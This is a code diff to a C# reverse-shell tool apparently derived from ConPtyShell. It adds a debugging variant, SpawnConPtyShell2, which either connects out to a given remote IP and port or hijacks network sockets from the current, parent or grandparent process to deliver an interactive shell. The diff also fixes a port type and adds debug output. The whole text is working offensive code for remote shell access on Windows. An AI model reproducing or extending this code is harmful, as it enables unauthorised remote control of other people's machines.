@@ -341,7 +341,7 @@ public static class SocketHijacking
     private struct SOCKADDR_IN
     {
         public short sin_family;
-        public short sin_port;
+        public ushort sin_port;
         public uint sin_addr;
         public long sin_zero;
     }
@@ -802,6 +802,8 @@ public static class SocketHijacking
             else {
                 Console.WriteLine("debug: socket handle not inherited, skipping... handle --> 0x" + socketHandle.ToString("X4"));
             }
+            Console.WriteLine("debug: ip and port of current process = " + IPAddress.Parse(sockaddrTargetProcess.sin_addr.ToString()).ToString() + ":" + sockaddrTargetProcess.sin_port.ToString());
+            Console.WriteLine("debug: ip and port of parent process = " + IPAddress.Parse(sockaddrParentProcess.sin_addr.ToString()).ToString() + ":" + sockaddrTargetProcess.sin_port.ToString());
             closesocket(parentSocketHandle);
         }
         return inherited;
@@ -1029,7 +1031,7 @@ public static class ConPtyShell
     private struct SOCKADDR_IN
     {
         public short sin_family;
-        public short sin_port;
+        public ushort sin_port;
         public uint sin_addr;
         public long sin_zero;
     }
@@ -1183,7 +1185,7 @@ public static class ConPtyShell
         SOCKADDR_IN sockinfo = new SOCKADDR_IN();
         sockinfo.sin_family = (short)2;
         sockinfo.sin_addr = inet_addr(host);
-        sockinfo.sin_port = (short)htons((ushort)port);
+        sockinfo.sin_port = htons((ushort)port);
 
         if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
         {
@@ -1446,6 +1448,91 @@ public static class ConPtyShell
         return thReadSocketWritePipe;
     }
 
+    public static string SpawnConPtyShell2(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
+    {
+        IntPtr shellSocket = IntPtr.Zero;
+        IntPtr InputPipeRead = IntPtr.Zero;
+        IntPtr InputPipeWrite = IntPtr.Zero;
+        IntPtr OutputPipeRead = IntPtr.Zero;
+        IntPtr OutputPipeWrite = IntPtr.Zero;
+        IntPtr handlePseudoConsole = IntPtr.Zero;
+        IntPtr oldStdIn = IntPtr.Zero;
+        IntPtr oldStdOut = IntPtr.Zero;
+        IntPtr oldStdErr = IntPtr.Zero;
+        bool parentSocketInherited = false;
+        bool grandParentSocketInherited = false;
+        bool conptyCompatible = false;
+        bool IsSocketOverlapped = true;
+        string output = "";
+        Process currentProcess = null;
+        Process parentProcess = null;
+        Process grandParentProcess = null;
+        if (GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") != IntPtr.Zero)
+            conptyCompatible = true;
+        CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
+        // comment the below function to debug errors
+        // InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
+        // init wsastartup stuff for this thread
+        InitWSAThread();
+        if (conptyCompatible)
+        {
+            Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
+            if (upgradeShell)
+            {
+                List<IntPtr> socketsHandles = new List<IntPtr>();
+                currentProcess = Process.GetCurrentProcess();
+                parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
+                if (parentProcess != null) grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
+                // try to duplicate the socket for the current process
+                shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess, ref IsSocketOverlapped);
+                if (shellSocket == IntPtr.Zero && parentProcess != null)
+                {
+                    // if no sockets are found in the current process we try to hijack our current parent process socket
+                    shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);
+                    if (shellSocket == IntPtr.Zero && grandParentProcess != null)
+                    {
+                        // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
+                        shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
+                        if (shellSocket == IntPtr.Zero)
+                        {
+                            throw new ConPtyShellException("No \\Device\\Afd objects found. Socket duplication failed.");
+                        }
+                        else
+                        {
+                            grandParentSocketInherited = true;
+                        }
+                    }
+                    else
+                    {
+                        // gotcha a usable socket from the parent process, let's see if the grandParent also use the socket
+                        parentSocketInherited = true;
+                        if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
+                    }
+                }
+                else
+                {
+                    // the current process got a usable socket, let's see if the parents use the socket
+                    if (parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
+                    if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
+                }
+            }
+            else
+            {
+                shellSocket = connectRemote(remoteIp, remotePort);
+                if (shellSocket == IntPtr.Zero)
+                {
+                    output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
+                    return output;
+                }
+                TryParseRowsColsFromSocket(shellSocket, ref rows, ref cols);
+            }
+            // debug code for checking handle duplication
+            Console.WriteLine("debug: Creating pseudo console...");
+            //Thread.Sleep(10000);
+        }
+        return "";
+    }
+
     public static string SpawnConPtyShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
     {
         IntPtr shellSocket = IntPtr.Zero;
@@ -1535,7 +1622,7 @@ public static class ConPtyShell
             // debug code for checking handle duplication
             Console.WriteLine("debug: Creating pseudo console...");
             Thread.Sleep(10000);
-            // return "";
+            //return "";
             int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
             if (pseudoConsoleCreationResult != 0)
             {
@@ -1744,7 +1831,7 @@ Examples:
                 uint rows = ParseRows(args);
                 uint cols = ParseCols(args);
                 string commandLine = ParseCommandLine(args);
-                output = ConPtyShell.SpawnConPtyShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
+                output = ConPtyShell.SpawnConPtyShell2(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
             }
             catch (Exception e)
             {
